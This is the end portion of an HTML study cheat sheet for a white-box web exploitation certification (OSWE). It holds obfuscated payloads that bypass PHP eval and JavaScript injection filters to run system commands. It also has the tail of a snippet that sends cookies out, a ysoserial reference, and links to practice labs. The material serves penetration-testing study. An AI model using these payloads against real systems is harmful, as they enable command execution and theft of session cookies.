})
  .then(() => console.log('Cookies sent'))
  .catch(error => console.error('Error:', error));
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="websocket-client-1">WebSocket Client</h3>
        <div class="code-container">
            <pre><code class="language-javascript">const socket = new WebSocket('ws://example.com/ws');

socket.onopen = function(event) {
  console.log('Connection opened');
  socket.send(JSON.stringify({ action: 'example' }));
};

socket.onmessage = function(event) {
  console.log('Message received:', event.data);
};

socket.onclose = function(event) {
  console.log('Connection closed');
};

socket.onerror = function(error) {
  console.error('Error:', error);
};
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="bypass-php-eval-filtering">Bypass PHP Eval Filtering</h2>
        <div class="code-container">
            <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
(new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');
</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="bypass-javascript-injection-filters">Bypass Javascript Injection Filters</h2>
        <div class="code-container">
            <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //"</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-javascript">(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="ysoserial-payload-creation">YSOSerial Payload Creation</h2>

        <h3 id="net-version">.NET Version</h3>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/pwntester/ysoserial.net</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h3 id="java-version">JAVA Version</h3>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/frohoff/ysoserial</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="report-recommendations">Report Recommendations</h2>
        <p>For code indentation:</p>
        <div class="code-container">
            <pre><code class="language-bash">Copy the code straight from VS Code into a 1x1 table in Word</code></pre>
            <button class="copy-btn">Copy</button>
        </div>

        <h2 id="additional-resources">Additional Resources</h2>
        <p>While the course material and labs should be enough to pass the exam, if you want further practice, I can recommend the following:</p>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/yeswehack/vulnerable-code-snippets</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/bmdyy/order</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/bmdyy/chat.js</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/bmdyy/tudo</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/bmdyy/testr</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/TROUBLE-1/White-box-pentesting</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://www.vulnhub.com/entry/securecode-1,651</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/takito1812/web-hacking-playground</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://pentesterlab.com/badges/codereview (paid)</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <div class="code-container">
            <pre><code class="language-bash">https://github.com/b1d0ws/OSWE</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Regex Learning:</p>
        <div class="code-container">
            <pre><code class="language-bash">https://regexlearn.com/learn/</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
        <p>Debug VM Recommended RDP Software</p>
        <div class="code-container">
            <pre><code class="language-bash">https://www.nomachine.com/</code></pre>
            <button class="copy-btn">Copy</button>
        </div>
    </main>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const burger = document.getElementById('burger');
            const sidebar = document.getElementById('sidebar');
            const overlay = document.getElementById('overlay');
            const closeBtn = document.getElementById('closeBtn');

            burger.addEventListener('click', function() {
                sidebar.classList.toggle('active');
                burger.classList.toggle('active');
                overlay.classList.toggle('active');
            });

            overlay.addEventListener('click', function() {
                sidebar.classList.remove('active');
                burger.classList.remove('active');
                overlay.classList.remove('active');
            });

            closeBtn.addEventListener('click', function() {
                sidebar.classList.remove('active');
                burger.classList.remove('active');
                overlay.classList.remove('active');
            });

            const sidebarLinks = document.querySelectorAll('.nav-links a');
            const main = document.querySelector('#main');

            sidebarLinks.forEach(link => {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    const targetId = this.getAttribute('href').substring(1);
                    const target = document.getElementById(targetId);
                    if (target) {
                        // Hide all elements except the h1
                        let child = main.firstChild;
                        while (child) {
                            if (child.nodeType === 1 && child.id !== 'oswe') {
                                child.style.display = 'none';
                            }
                            child = child.nextSibling;
                        }
                        // Show the h1 always
                        document.getElementById('oswe').style.display = '';

                        // Collect and show the target and its section content
                        const targetTag = target.tagName;
                        const targetLevel = parseInt(targetTag.substring(1));
                        let current = target;
                        while (current) {
                            current.style.display = '';
                            let next = current.nextElementSibling;
                            if (next) {
                                const nextTag = next.tagName;
                                if (nextTag.startsWith('H')) {
                                    const nextLevel = parseInt(nextTag.substring(1));
                                    if (nextLevel <= targetLevel) {
                                        break;
                                    }
                                }
                            } else {
                                break;
                            }
                            current = next;
                        }
                        // Scroll to the target
                        target.scrollIntoView({behavior: 'smooth'});
                    }
                    // Close sidebar on click
                    sidebar.classList.remove('active');
                    burger.classList.remove('active');
                    overlay.classList.remove('active');
                });
            });

            // Copy functionality
            const copyBtns = document.querySelectorAll('.copy-btn');
            copyBtns.forEach(btn => {
                btn.addEventListener('click', function() {
                    const pre = this.previousElementSibling;
                    const code = pre.querySelector('code');
                    const text = code.innerText;
                    navigator.clipboard.writeText(text).then(() => {
                        this.textContent = 'Copied!';
                        this.classList.add('copied');
                        setTimeout(() => {
                            this.textContent = 'Copy';
                            this.classList.remove('copied');
                        }, 2000);
                    }).catch(err => {
                        console.error('Failed to copy: ', err);
                    });
                });
            });
        });
    </script>
</body>
</html>
